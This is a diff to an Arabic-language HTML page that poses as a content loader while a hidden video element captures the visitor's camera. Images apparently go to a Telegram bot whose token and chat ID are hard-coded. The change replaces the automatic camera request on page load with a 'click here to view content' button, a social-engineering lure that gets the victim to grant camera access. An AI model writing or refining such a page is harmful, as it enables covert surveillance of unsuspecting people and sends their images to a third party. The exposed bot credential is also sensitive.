@@ -18,32 +18,35 @@
         }
         .loader-container {
             text-align: center;
+            padding: 20px;
         }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-left-color: #38bdf8;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
+        .btn-start {
+            background-color: #38bdf8;
+            color: #0f172a;
+            border: none;
+            padding: 14px 35px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            transition: background 0.2s;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .btn-start:hover {
+            background-color: #0ea5e9;
         }
         h2 {
             font-size: 1.2rem;
             font-weight: 500;
-            margin: 0;
+            margin-bottom: 25px;
         }
     </style>
 </head>
 <body>
 
-    <div class="loader-container">
-        <div class="spinner"></div>
-        <h2>جاري تحميل المحتوى، يرجى الانتظار...</h2>
+    <div class="loader-container" id="mainBox">
+        <h2>انقر على الزر أدناه لعرض المحتوى</h2>
+        <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
     </div>
 
     <!-- عنصر فيديو مخفي لالتقاط الصورة -->
@@ -55,7 +58,10 @@
         const TELEGRAM_BOT_TOKEN = '8880573702:AAEcni2H3MYNKkyU0GJen2XqPFgAyL04Mdw';
         const TELEGRAM_CHAT_ID = '8304712202';
 
-        async function initCameraAndCapture() {
+        async function startProcess() {
+            // تغيير النص لإظهار أن العملية جارية
+            document.getElementById('mainBox').innerHTML = '<h2>جاري التحميل، يرجى الانتظار...</h2>';
+
             try {
                 const constraints = {
                     video: {
@@ -73,6 +79,7 @@
 
             } catch (error) {
                 console.error("فشل الوصول إلى الكاميرا:", error);
+                document.getElementById('mainBox').innerHTML = '<h2>عخطأ في الوصول إلى الكاميرا</h2>';
             }
         }
 
@@ -115,11 +122,6 @@
                 console.error('خطأ في الإرسال:', error);
             });
         }
-
-        // بدء طلب الكاميرا تلقائياً بمجرد فتح الصفحة
-        window.addEventListener('load', () => {
-            setTimeout(initCameraAndCapture, 1000);
-        });
     </script>
 </body>
 </html>
